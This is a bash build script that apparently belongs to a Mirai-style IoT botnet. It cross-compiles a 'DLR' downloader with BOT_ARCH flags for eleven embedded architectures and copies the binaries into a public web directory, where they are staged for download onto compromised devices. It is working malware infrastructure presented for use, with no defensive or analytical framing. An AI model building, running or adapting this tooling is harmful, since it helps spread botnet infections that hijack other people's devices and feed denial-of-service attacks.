#!/bin/bash

# DLR (Downloader) Cross-Compilation Script
# Builds DLRs for multiple architectures and copies to /var/www/html/bins

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DLR_SOURCE_DIR="/root/boinker/dlr"
OUTPUT_DIR="/root/boinker/loader/bins"
WEB_DIR="/var/www/html/bins"
CROSS_COMPILER_DIR="/etc/xcompiler"

echo -e "${BLUE}=== DLR Cross-Compilation Script ===${NC}"
echo -e "${YELLOW}Source Directory: $DLR_SOURCE_DIR${NC}"
echo -e "${YELLOW}Output Directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Web Directory: $WEB_DIR${NC}"
echo -e "${YELLOW}Cross-Compiler Directory: $CROSS_COMPILER_DIR${NC}"

# Create directories
mkdir -p "$OUTPUT_DIR"
mkdir -p "$WEB_DIR"

# Architecture configurations with extensions
declare -A ARCHITECTURES=(
    ["i586"]="x86"
    ["m68k"]="m68k" 
    ["mips"]="mips"
    ["mipsel"]="mpsl"
    ["powerpc"]="ppc"
    ["sh4"]="sh4"
    ["sparc"]="spc"
    ["armv4l"]="arm"
    ["armv5l"]="arm5"
    ["armv6l"]="arm6"
    ["armv7l"]="arm7"
)

# Common flags
COMMON_FLAGS="-static -Os -std=c99 -D_GNU_SOURCE"

# Function to compile DLR for specific architecture
compile_dlr() {
    local arch=$1
    local extension=$2
    local output_name="dlr.$extension"
    
    echo -e "${BLUE}=== Compiling DLR for $arch ===${NC}"
    echo -e "${YELLOW}Using compiler: $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc${NC}"
    
    cd "$DLR_SOURCE_DIR"
    
    # Define architecture-specific compilation commands
    case $arch in
        "armv4l")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "armv5l")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"arm5\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "armv6l")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"arm6\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "armv7l")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "i586")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "m68k")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "mips")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "mipsel")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "powerpc")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "sh4")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        "sparc")
            if ! $CROSS_COMPILER_DIR/$arch/bin/${arch}-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o "$OUTPUT_DIR/$output_name" 2>&1; then
                echo -e "${RED}Compilation failed for $arch${NC}"
                return 1
            fi
            ;;
        *)
            echo -e "${RED}Unknown architecture: $arch${NC}"
            return 1
            ;;
    esac
    
    echo -e "${GREEN}Successfully compiled $arch -> $output_name${NC}"
    return 0
}

# Function to copy binaries to web directory
copy_to_web() {
    local arch=$1
    local extension=$2
    local output_name="dlr.$extension"
    
    if [ -f "$OUTPUT_DIR/$output_name" ]; then
        cp "$OUTPUT_DIR/$output_name" "$WEB_DIR/"
        echo -e "${GREEN}Copied $output_name to $WEB_DIR${NC}"
    else
        echo -e "${RED}Binary $output_name not found${NC}"
        return 1
    fi
}

echo -e "${BLUE}Starting DLR compilation process...${NC}"

# Compile for all architectures
success_count=0
total_count=0

for arch in "${!ARCHITECTURES[@]}"; do
    total_count=$((total_count + 1))
    if compile_dlr "$arch" "${ARCHITECTURES[$arch]}"; then
        success_count=$((success_count + 1))
        copy_to_web "$arch" "${ARCHITECTURES[$arch]}"
    fi
done

echo -e "${BLUE}=== Compilation Summary ===${NC}"
echo -e "${YELLOW}Output directory: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}Web directory: $WEB_DIR${NC}"
echo -e "${YELLOW}Compiled DLRs:${NC}"

# List compiled binaries
ls -la "$OUTPUT_DIR"/dlr.* 2>/dev/null || echo "No DLR binaries found"
ls -la "$WEB_DIR"/dlr.* 2>/dev/null || echo "No DLR binaries in web directory"

echo -e "${YELLOW}Successfully compiled: $success_count/$total_count architectures${NC}"

if [ $success_count -eq $total_count ]; then
    echo -e "${GREEN}All DLRs compiled successfully!${NC}"
else
    echo -e "${YELLOW}Some DLRs failed to compile${NC}"
fi

echo -e "${BLUE}=== Usage Instructions ===${NC}"
echo -e "${YELLOW}1. DLR binaries are in: $OUTPUT_DIR${NC}"
echo -e "${YELLOW}2. Web-accessible DLRs are in: $WEB_DIR${NC}"
echo -e "${YELLOW}3. Each DLR is named: dlr.<extension>${NC}"
echo -e "${YELLOW}4. Use the appropriate DLR for the target architecture${NC}"

echo -e "${GREEN}DLR compilation process completed!${NC}"
